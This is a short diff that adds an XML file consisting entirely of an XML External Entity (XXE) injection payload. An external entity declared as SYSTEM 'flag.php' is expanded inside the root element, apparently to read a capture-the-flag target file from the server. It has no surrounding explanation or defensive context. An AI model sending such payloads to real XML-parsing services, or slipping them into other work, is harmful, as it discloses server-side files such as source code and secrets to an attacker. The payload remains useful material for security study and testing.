@@ -1,0 +1,9 @@
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY test SYSTEM 'flag.php'>
+]>
+<root>
+&test;
+</root>
+
+
